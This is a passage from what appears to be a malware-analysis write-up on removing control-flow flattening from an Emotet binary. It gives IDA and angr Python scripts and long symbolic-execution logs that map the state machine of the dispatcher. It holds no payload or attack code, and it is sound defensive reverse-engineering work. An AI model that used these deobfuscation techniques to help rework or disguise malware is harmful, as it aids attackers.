0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 5 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 7 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 7 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 9 !! Already processed for this state - END !! ============================== BB: 0x10009894 - 0x100098a0 State Value: 9 !! Already processed for this state - END !! ============================== BB: 0x1000956f - 0x10009573 State Value: 4 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 5 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 5 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 7 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 7 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 4 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 5 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 7 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 7 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x10009573 - 0x1000957b State Value: 5 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 7 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 !! Already processed for this state - END !! ============================== BB: 0x10009573 - 0x1000957b State Value: 7 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 !! Already processed for this state - END !! ** Completed initial analysis ** 0x10008784 - States: [0] Children: [&#39;0x10008914&#39;] 0x10008914 - States: [0] Children: [&#39;0x10008aa1&#39;] 0x10008aa1 - States: [0] Children: [&#39;0x10008c31&#39;] 0x10008c31 - States: [0] Children: [&#39;0x10008dbb&#39;] 0x10008dbb - States: [0] Children: [&#39;0x10008f47&#39;] 0x10008f47 - States: [0] Children: [&#39;0x100090d0&#39;] 0x100090d0 - States: [0] Children: [&#39;0x1000925d&#39;] 0x1000925d - States: [0] Children: [&#39;0x100093e6&#39;] 0x100093e6 - States: [0] Children: [&#39;0x1000953a&#39;] 0x1000953a - States: [0, 1, 9] Children: [&#39;0x10009549&#39;] 0x10009549 - States: [0, 1, 2, 3, 4, 5, 7, 9] Children: [&#39;0x10009894&#39;, &#39;0x10009555&#39;] 0x10009555 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x1000955b&#39;, &#39;0x10009863&#39;] 0x1000955b - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x10009563&#39;, &#39;0x100097cd&#39;] 0x10009563 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x10009713&#39;, &#39;0x1000956f&#39;] 0x1000956f - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x100095a9&#39;, &#39;0x10009573&#39;] 0x10009573 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x1000957b&#39;, &#39;0x100099c6&#39;] 0x1000957b - States: [9] Children: [&#39;0x10009595&#39;] 0x10009595 - States: [9] Children: [&#39;0x1000953a&#39;] 0x100095a9 - States: [7] Children: [&#39;0x100095c2&#39;] 0x100095c2 - States: [7] Children: [&#39;0x100095e3&#39;] 0x100095e3 - States: [7] Children: [&#39;0x10009615&#39;] 0x10009615 - States: [7] Children: [&#39;0x100096a2&#39;] 0x100096a2 - States: [7] Children: [&#39;0x100096d6&#39;] 0x100096d6 - States: [7] Children: [&#39;0x100096f2&#39;] 0x100096f2 - States: [7] Children: [&#39;0x100096f5&#39;] 0x100096f5 - States: [5, 7] Children: [&#39;0x100096fa&#39;] 0x100096fa - States: [3, 4, 5, 7] Children: [&#39;0x100099c6&#39;] 0x10009713 - States: [5] Children: [&#39;0x10009732&#39;] 0x10009732 - States: [5] Children: [&#39;0x10009750&#39;] 0x10009750 - States: [5] Children: [&#39;0x1000977e&#39;] 0x1000977e - States: [5] Children: [&#39;0x100097af&#39;] 0x100097af - States: [5] Children: [&#39;0x100097c5&#39;] 0x100097c5 - States: [5] Children: [&#39;0x100096f5&#39;] 0x100097cd - States: [3] Children: [&#39;0x100097e6&#39;] 0x100097e6 - States: [3] Children: [&#39;0x10009830&#39;] 0x10009830 - States: [3] Children: [&#39;0x1000985b&#39;] 0x1000985b - States: [3] Children: [&#39;0x100096fa&#39;] 0x10009863 - States: [1] Children: [&#39;0x1000988a&#39;] 0x1000988a - States: [1] Children: [&#39;0x1000953a&#39;] 0x10009894 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098a0&#39;, &#39;0x100099c1&#39;] 0x100098a0 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098e8&#39;, &#39;0x100098a4&#39;] 0x100098a4 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098ac&#39;, &#39;0x100099c6&#39;] 0x100098ac - States: [6] Children: [&#39;0x100098d8&#39;] 0x100098d8 - States: [6] Children: [&#39;0x100098db&#39;] 0x100098db - States: [8, 6] Children: [] 0x100098e8 - States: [4] Children: [&#39;0x10009904&#39;] 0x10009904 - States: [4] Children: [&#39;0x1000998c&#39;] 0x1000998c - States: [4] Children: [&#39;0x10009998&#39;, &#39;0x1000999f&#39;] 0x10009998 - States: [4] Children: [&#39;0x100099a4&#39;] 0x1000999f - States: [4] Children: [&#39;0x100099a4&#39;] 0x100099a4 - States: [4] Children: [&#39;0x100099ba&#39;] 0x100099ba - States: [4] Children: [&#39;0x100096fa&#39;] 0x100099c1 - States: [2] Children: [&#39;0x100099c6&#39;] 0x100099c6 - States: [0, 1, 2, 3, 4, 5, 7, 9] Children: [&#39;0x10009549&#39;, &#39;0x100099d2&#39;] 0x100099d2 - States: [8] Children: [&#39;0x100098db&#39;] . IDA Script - Label The Basic Blocks . import idaapi import idautils import idc from queue import Queue import struct bb_states = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} def set_bb_color(ea_start, ea_end, color_value): ea_end = prev_head(ea_end) ptr = ea_start while ptr &lt;= ea_end : set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) for b in bb_states: print(f&quot;{hex(b)} - {hex(bb_states[b].get(&#39;end&#39;))}: {bb_states[b].get(&#39;is_obb&#39;)}&quot;) if bb_states[b].get(&#39;is_obb&#39;): set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00ff00) else: set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00A5ff) # Color the bb entry set_color(b, CIC_ITEM, 0xc0c0c0) . Obtain STATE and NEXT-STATE Information For Each Basic Block . loop through all bb | start with STATE = 0 in obb | from obb run until you hit a cf bb - push branches onto queue note the STATE register VALUE - this is the NEXT STATE VALUE | use the STATE register value to derive the FLAGS constraints (this will be used for patching) | note the STATE end bb | . | from cf run until you hit an obb assign the NEXT STATE VALUE to this obb and note the STATE entry bb | . | end at obb you have alreay seen | end at end block | . state_map[&#39;state_value&#39;] = {&#39;state_value&#39;: None &#39;entry_bb&#39;: None &#39;exit_bb&#39;: None &#39;next_states&#39;: [ {&#39;state_value&#39;:None, &#39;flags&#39;: None }, ] } . # state_table[state_value] = { # &#39;entry&#39;:&lt;entry_bb_address&gt;, # &#39;exit&#39;:&lt;exit_bb_address&gt;, # &#39;next_states&#39;:[{&#39;state_value&#39;:&lt;&gt;, &#39;flags&#39;:&lt;constrait_flags&gt;},] # } state_table = {} ## Build list of cf and obb blocks cf_bb_list = [] obb_list = [] for bb_address in bb_state_map: if bb_state_map[bb_address].get(&#39;is_obb&#39;): obb_list.append(bb_address) else: cf_bb_list.append(bb_address) # Use a queue for BFS # The queue contains state_info = { # &#39;state_value&#39;:0, # &#39;sim_state&#39;:initial_state, # &#39;entry&#39;:true/false, # &#39;condition&#39;:&lt;none / jz / etc.&gt; # } q = Queue() # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; # Start angr project project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Setup function initial state on queue initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Add first state to state table (call it state 0) state_table[0] = {&#39;entry&#39;:fn_start, &#39;exit&#39;:None,&#39;next_states&#39;:[]} # Push state info for first state onto queue state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state, &#39;entry&#39;:True, &#39;condition&#39;:None } q.put(state_info) # Walk the queue while not q.empty(): state_info = q.get() state_value = state_info.get(&#39;state_value&#39;) state_entry = state_info.get(&#39;entry&#39;) old_sim_state = state_info.get(&#39;sim_state&#39;) # Flag to control end of state and error end state_end = False error_end = False sim_state = old_sim_state # # Setup blank state but carry regsiters # # Set clean sim_state # if not state_entry: # sim_state = old_sim_state # else: # sim_state = project.factory.blank_state(addr=old_sim_state.addr) # sim_state.options.add(angr.options.CALLLESS) # for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: # if reg_name != state_register: # sim_state.memory.store(sim_state.regs.get(reg_name), old_sim_state.regs.get(reg_name)) print(f&quot; n n n======================== n&quot;) print(f&quot;Walking obbs for state {hex(state_value)} - Entry: {state_entry}&quot;) # Walk until cf or branch or dead loop_limit_count = 0 while loop_limit_count &lt;= 1000: loop_limit_count += 1 print(f&quot;obb walk: {hex(sim_state.addr)}&quot;) #print(f&quot;STATE:{sim_state.regs.ebx} - FLAGS: {sim_state.regs.flags.variables}&quot;) successors = list(project.factory.successors(sim_state)) # print(f&quot;Successors:&quot;) # for s in successors: # print(f&quot; t{hex(s.addr)} - STATE:{s.regs.get(state_register)}&quot;) if len(successors) == 0: # dead - mark this bb as exit - continue next in queue state_table[state_value][&#39;exit&#39;] = sim_state.addr state_end = True print(f&quot;State {hex(state_value)} exit at bb: {hex(sim_state.addr)}&quot;) break elif len(successors) &gt; 1: # Check each one to see if it is a cf # Assumption: there should never be a branch from an obb into the dispatcher if successors[0].addr in cf_bb_list and successors[1].addr in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch both successors are cf&quot;) error_end = True break elif successors[0].addr in cf_bb_list and successors[1].addr not in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch successor[0] are cf&quot;) error_end = True break elif successors[0].addr not in cf_bb_list and successors[1].addr in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch successor[1] are cf&quot;) error_end = True break else: # branch - push second on queue and continue walking print(&quot;Branch found!&quot;) # if the condition is an == we can save it in the hope that it might be useful # when determining a state later -- this is a hack and we don&#39;t propogate conditions for # multiple obb branches -- there should be a better way to do this??? successors[0].solver.simplify() successors[1].solver.simplify() constraints_0 = [] constraints_1 = [] for cc in successors[0].solver.constraints: if not cc.concrete: constraints_0.append(cc) for cc in successors[1].solver.constraints: if not cc.concrete: constraints_1.append(cc) if len(constraints_0) == 1 and len(constraints_1): if constraints_0[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successors[0].addr)} is __eq__ pushing to queue&quot;) sim_state = successors[1] queue_state = successors[0].copy() branch_condition = &#39;jz&#39; elif constraints_1[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successors[1].addr)} is __eq__ pushing to queue&quot;) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = &#39;jz&#39; else: print(f&quot;Constraint is not __eq__ not propogating condition&quot;) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = None else: print(f&quot;More than one constraint not propogating condition&quot;) print(constraints_0) print(constraints_1) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = None print(f&quot;Add bb: {hex(queue_state.addr)} to queue - continue with bb: {hex(sim_state.addr)}&quot;) branch_state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:queue_state, &#39;entry&#39;:False, &#39;condition&#39;:branch_condition} q.put(branch_state_info) else: # Check if the sccessor is outside of the function, this is some crazy angr thing with # following ret instructions instead of dying if successors[0].addr &lt; fn_start or successors[0].addr &gt; fn_end: # This is an end state - mark this bb as exit - continue next in queue state_table[state_value][&#39;exit&#39;] = sim_state.addr state_end = True print(f&quot;State {hex(state_value)} return at bb: {hex(sim_state.addr)}&quot;) break if successors[0].addr in cf_bb_list: successor = successors[0] # cf - get state value (next state) # - get flags and add to state table next states next_state_values = successor.solver.eval_upto(successor.regs.get(state_register), 4) print(f&quot;{successor.regs.get(state_register)}&quot;) ######### DEBUG Constrain Next State ######### conditions_map = {} # Looking for ast in the form IF (foo __eq__ bar) then STATE1 else STATE2 state_reg_ast = successor.regs.get(state_register) if not state_reg_ast.concrete: if state_reg_ast.op == &#39;If&#39; and not state_reg_ast.args[1].symbolic and not state_reg_ast.args[1].symbolic: if state_reg_ast.args[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successor.solver.eval(state_reg_ast.args[1]))} constrained by jz&quot;) conditions_map[successor.solver.eval(state_reg_ast.args[1])] = &#39;jz&#39; print(f&quot;{hex(successor.solver.eval(state_reg_ast.args[2]))} unconstrained&quot;) else: print(f&quot;!!!! If condition {state_reg_ast.args[0].op} not handled&quot;) else: print(&quot;!!!! Top level condition to complex to handle&quot;) else: # If this is concrete test if it has a prior condition if state_info.get(&#39;condition&#39;, None) is None: print(&quot; * Concrete * &quot;) else: print(f&quot; * Queue condtion {state_info.get(&#39;condition&#39;)} * &quot;) conditions_map[next_state_values[0]] = &#39;jz&#39; ########################################## # Save info to state table state_table[state_value][&#39;exit&#39;] = sim_state.addr for next_state_value in next_state_values: state_table[state_value][&#39;next_states&#39;].append({&#39;state_value&#39;:next_state_value, &#39;condition&#39;:conditions_map.get(next_state_value,None)}) print(f&quot;State: {hex(state_value)} -&gt; Next States {[hex(s) for s in next_state_values]}&quot;) sim_state = successors[0] break else: sim_state = successors[0] # Check state end flag if state_end: continue if error_end: break print(f&quot; n n&quot;) frozen_sim_state = sim_state # For each state match with obb and push onto queue # - if seen - continue next in queue # - if not seen walk to obb for next_state_value in next_state_values: print(f&quot;Walking dispatcher for state {hex(next_state_value)}&quot;) if state_entry and next_state_value in state_table: # We have already processed this skip print(f&quot;Already processed {hex(next_state_value)} - skip!&quot;) continue # Setup sim_state with concrete state_value sim_state = frozen_sim_state.copy() sim_state.regs.__setattr__(state_register, next_state_value) # Walk until obb loop_limit_count = 0 while loop_limit_count &lt;= 1000: loop_limit_count += 1 print(f&quot;cf walk: {hex(sim_state.addr)}&quot;) successors = list(project.factory.successors(sim_state)) # print(f&quot; t Successors: {[hex(s.addr) for s in successors]}&quot;) if len(successors) == 0: # dead - error! no path for state through dispatcher print(f&quot;ERROR no path through dispatcher for state {hex(next_state_value)} - end bb: {hex(sim_state.addr)}&quot;) error_end = True break elif len(successors) &gt; 1: # branch - error! duplicate dispatcher paths print(f&quot;ERROR duplicate paths through dispatcher for state {hex(next_state_value)} - branch bb: {hex(sim_state.addr)}&quot;) for s in successors: for c in s.solver.constraints: print(f&quot; t{c}&quot;) error_end = True break else: if successors[0].addr in obb_list: print(f&quot;Found matching obb: {hex(successors[0].addr)}&quot;) # obb - add state and entry to state_table state_table[next_state_value] = {&#39;entry&#39;:successors[0].addr, &#39;exit&#39;:None, &#39;next_states&#39;:[]} # - push to queue - continue next in queue new_state_info = {&#39;state_value&#39;:next_state_value, &#39;sim_state&#39;:successors[0].copy(), &#39;entry&#39;:True, &#39;condition&#39;:None} q.put(new_state_info) break else: sim_state = successors[0] if error_end: break if error_end: break . ======================== Walking obbs for state 0x0 - Entry: True obb walk: 0x10008784 obb walk: 0x10008914 obb walk: 0x10008aa1 obb walk: 0x10008c31 obb walk: 0x10008dbb obb walk: 0x10008f47 obb walk: 0x100090d0 obb walk: 0x1000925d obb walk: 0x100093e6 &lt;BV32 0x9a37631&gt; * Concrete * State: 0x0 -&gt; Next States [&#39;0x9a37631&#39;] Walking dispatcher for state 0x9a37631 cf walk: 0x10009894 Found matching obb: 0x100099c1 ======================== Walking obbs for state 0x9a37631 - Entry: True obb walk: 0x100099c1 &lt;BV32 0x3fd6f7a&gt; * Concrete * State: 0x9a37631 -&gt; Next States [&#39;0x3fd6f7a&#39;] Walking dispatcher for state 0x3fd6f7a cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 Found matching obb: 0x10009713 ======================== Walking obbs for state 0x3fd6f7a - Entry: True obb walk: 0x10009713 obb walk: 0x10009732 obb walk: 0x10009750 obb walk: 0x1000977e obb walk: 0x100097af obb walk: 0x100097c5 &lt;BV32 if fake_ret_value_278_32{UNINITIALIZED} == 0x0 then 0x8d4442d else 0xd886856&gt; 0x8d4442d constrained by jz 0xd886856 unconstrained State: 0x3fd6f7a -&gt; Next States [&#39;0xd886856&#39;, &#39;0x8d4442d&#39;] Walking dispatcher for state 0xd886856 cf walk: 0x100096f5 cf walk: 0x100099c6 Found matching obb: 0x100099d2 Walking dispatcher for state 0x8d4442d cf walk: 0x100096f5 cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 cf walk: 0x1000956f Found matching obb: 0x100095a9 ======================== Walking obbs for state 0xd886856 - Entry: True obb walk: 0x100099d2 obb walk: 0x100098db State 0xd886856 return at bb: 0x100098db ======================== Walking obbs for state 0x8d4442d - Entry: True obb walk: 0x100095a9 obb walk: 0x100095c2 obb walk: 0x100095e3 obb walk: 0x10009615 obb walk: 0x100096a2 obb walk: 0x100096d6 obb walk: 0x100096f2 &lt;BV32 if fake_ret_value_284_32{UNINITIALIZED} == 0x0 then 0x3db060f else 0xe571e86&gt; 0x3db060f constrained by jz 0xe571e86 unconstrained State: 0x8d4442d -&gt; Next States [&#39;0x3db060f&#39;, &#39;0xe571e86&#39;] Walking dispatcher for state 0x3db060f cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b Found matching obb: 0x100097cd Walking dispatcher for state 0xe571e86 cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009894 cf walk: 0x100098a0 cf walk: 0x100098a4 Found matching obb: 0x100098ac ======================== Walking obbs for state 0x3db060f - Entry: True obb walk: 0x100097cd obb walk: 0x100097e6 obb walk: 0x10009830 obb walk: 0x1000985b &lt;BV32 if fake_ret_value_289_32{UNINITIALIZED} == 0x0 then 0x9005e79 else 0xe571e86&gt; 0x9005e79 constrained by jz 0xe571e86 unconstrained State: 0x3db060f -&gt; Next States [&#39;0x9005e79&#39;, &#39;0xe571e86&#39;] Walking dispatcher for state 0x9005e79 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 cf walk: 0x1000956f cf walk: 0x10009573 Found matching obb: 0x1000957b Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! ======================== Walking obbs for state 0xe571e86 - Entry: True obb walk: 0x100098ac obb walk: 0x100098d8 State 0xe571e86 return at bb: 0x100098d8 ======================== Walking obbs for state 0x9005e79 - Entry: True obb walk: 0x1000957b obb walk: 0x10009595 &lt;BV32 if fake_ret_value_294_32{UNINITIALIZED} == 0x0 then 0xe571e86 else 0xabd1e15&gt; 0xe571e86 constrained by jz 0xabd1e15 unconstrained State: 0x9005e79 -&gt; Next States [&#39;0xe571e86&#39;, &#39;0xabd1e15&#39;] Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! Walking dispatcher for state 0xabd1e15 cf walk: 0x1000953a cf walk: 0x10009894 cf walk: 0x100098a0 Found matching obb: 0x100098e8 ======================== Walking obbs for state 0xabd1e15 - Entry: True obb walk: 0x100098e8 obb walk: 0x10009904 obb walk: 0x1000998c Branch found! 0x10009998 is __eq__ pushing to queue Add bb: 0x10009998 to queue - continue with bb: 0x1000999f obb walk: 0x1000999f obb walk: 0x100099ba &lt;BV32 0x94ee303&gt; * Concrete * State: 0xabd1e15 -&gt; Next States [&#39;0x94ee303&#39;] Walking dispatcher for state 0x94ee303 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 Found matching obb: 0x10009863 ======================== Walking obbs for state 0xabd1e15 - Entry: False obb walk: 0x10009998 obb walk: 0x100099a4 obb walk: 0x100099ba &lt;BV32 0xe571e86&gt; * Queue condtion jz * State: 0xabd1e15 -&gt; Next States [&#39;0xe571e86&#39;] Walking dispatcher for state 0xe571e86 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009894 cf walk: 0x100098a0 cf walk: 0x100098a4 Found matching obb: 0x100098ac ======================== Walking obbs for state 0x94ee303 - Entry: True obb walk: 0x10009863 obb walk: 0x1000988a &lt;BV32 0xe571e86&gt; * Concrete * State: 0x94ee303 -&gt; Next States [&#39;0xe571e86&#39;] Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! ======================== Walking obbs for state 0xe571e86 - Entry: True obb walk: 0x100098ac obb walk: 0x100098d8 State 0xe571e86 return at bb: 0x100098d8 . for state in state_table: print(f&quot;{hex(state)} tEntry:{hex(state_table[state][&#39;entry&#39;])} Exit:{hex(state_table[state][&#39;exit&#39;])} -&gt; &quot;) for next_state in state_table[state][&#39;next_states&#39;]: print(f&quot; t t t t t t t{hex(next_state.get(&#39;state_value&#39;))}: {next_state.get(&#39;condition&#39;)} &quot;) . 0x0 Entry:0x10008784 Exit:0x100093e6 -&gt; 0x9a37631: None 0x9a37631 Entry:0x100099c1 Exit:0x100099c1 -&gt; 0x3fd6f7a: None 0x3fd6f7a Entry:0x10009713 Exit:0x100097c5 -&gt; 0xd886856: None 0x8d4442d: jz 0xd886856 Entry:0x100099d2 Exit:0x100098db -&gt; 0x8d4442d Entry:0x100095a9 Exit:0x100096f2 -&gt; 0x3db060f: jz 0xe571e86: None 0x3db060f Entry:0x100097cd Exit:0x1000985b -&gt; 0x9005e79: jz 0xe571e86: None 0xe571e86 Entry:0x100098ac Exit:0x100098d8 -&gt; 0x9005e79 Entry:0x1000957b Exit:0x10009595 -&gt; 0xe571e86: jz 0xabd1e15: None 0xabd1e15 Entry:0x100098e8 Exit:0x100099ba -&gt; 0x94ee303: None 0xe571e86: jz 0x94ee303 Entry:0x10009863 Exit:0x1000988a -&gt; 0xe571e86: None . print(bb_state_map) print(&#39;==============&#39;) print(state_table) . {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: 